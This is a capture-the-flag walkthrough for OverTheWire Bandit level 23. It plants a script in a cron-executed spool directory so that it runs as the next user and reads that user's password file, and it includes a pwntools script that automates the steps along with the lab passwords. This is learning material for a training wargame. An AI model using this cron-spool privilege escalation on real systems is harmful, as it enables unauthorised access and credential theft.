# Bandit Level 23

```bash
Username: bandit23
Password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
Server:   bandit.labs.overthewire.org
Port:     2220
```

First we need to connect:
```bash
ssh bandit23@bandit.labs.overthewire.org -p2220
```

Lets take a look at the cronjob:
```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
  echo "Handling $i"
  timeout -s 9 60 ./$i
  rm -f ./$i
    fi
done
```

We need to create a script which extracts the password for bandit24.

We should save it at ```/var/spool/bandit24``` and give it execute permissions.

After that, we just need to wait up to one minute and get our result.
```bash
cd /var/spool
bandit23@bandit:/var/spool$ mkdir /tmp/roee
bandit23@bandit:/var/spool$ chmod 777 /tmp/roee
bandit23@bandit:/var/spool$ printf "cat /etc/bandit_pass/bandit24 > /tmp/roee/bandit24pass" > ./bandit24/my_script
bandit23@bandit:/var/spool$ chmod +x ./bandit24/my_script
bandit23@bandit:/var/spool$ ls ./bandit24/my_script
./bandit24/my_script
bandit23@bandit:/var/spool$ date
Wed May 15 10:36:54 CEST 2019
bandit23@bandit:/var/spool$ date
Wed May 15 10:37:03 CEST 2019
bandit23@bandit:/var/spool$ ls ./bandit24/my_script
ls: cannot access './bandit24/my_script': No such file or directory
bandit23@bandit:/var/spool$ ls -la /tmp/roee
total 1712
drwxrwxrwx     2 bandit23 root        4096 May 15 10:37 .
drwxrws-wt 37684 root     root     1740800 May 15 10:37 ..
-rw-r--r--     1 bandit24 bandit24      33 May 15 10:37 bandit24pass
bandit23@bandit:/var/spool$ cat /tmp/roee/bandit24pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

We got the password for the next level: **UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ**

**A single script is:**
```python
#!/usr/bin/env python

from pwn import *


def main():
  shell = ssh(host='bandit.labs.overthewire.org',
            user='bandit23',
            password='jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n',
            port=2220
       )

  
  p = shell['cat /etc/cron.d/cronjob_bandit24']

  bash_script = p.split('\n')[1].split()[-3]
  log.info('Found bash script: {}'.format(bash_script))

  p = shell['cat {}'.format(bash_script)]

  cronjob_script = p.split('\n')[3]
  log.info('Found cronjob script: {}'.format(cronjob_script))

  tmp_dir = shell['mktemp -d']
  log.info('Created temporary directory: {}'.format(tmp_dir))
  shell['chmod 777 {}'.format(tmp_dir)]

  shell['printf "cat /etc/bandit_pass/bandit24 > {}/bandit24pass" > /var/spool/bandit24/my_script'.format(tmp_dir)]
  shell['chmod +x /var/spool/bandit24/my_script']
  log.info('Created script and updated permissions: {}'.format('/var/spool/bandit24/my_script'))

  cur_time = shell['date']
  secs = int(cur_time.split()[3].split(':')[-1])
  wait_secs = 60 - secs

  p = log.progress('Need to wait {} seconds'.format(wait_secs))
  for i in range(wait_secs + 1, -1, -1):
    time.sleep(1)
    p.status('{} seconds more...'.format(i))
  p.success('Done')
  
  password = shell['cat {}/bandit24pass'.format(tmp_dir)]

  print password

if __name__ == "__main__":
  main()
```